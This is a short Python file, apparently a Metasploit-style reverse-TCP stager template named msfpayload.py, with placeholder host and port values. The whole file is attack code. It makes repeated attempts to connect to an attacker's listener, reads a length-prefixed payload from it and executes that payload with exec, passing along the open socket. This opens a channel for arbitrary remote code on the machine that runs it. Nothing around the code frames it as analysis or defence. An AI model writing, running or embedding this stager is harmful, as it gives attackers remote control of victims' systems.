#Module - msfpayload.py (header required)
import socket
from struct import unpack
from time import sleep

for x in range(10):
    try:
        s = socket.socket(2, socket.SOCK_STREAM)
        s.connect(('MSFHOST', MSFPORT))
        break
    except:
        sleep(5)
l = unpack('>I', s.recv(4))[0]
d = s.recv(l)
while len(d) < l:
    d += s.recv(l - len(d))
exec (d, {'s': s})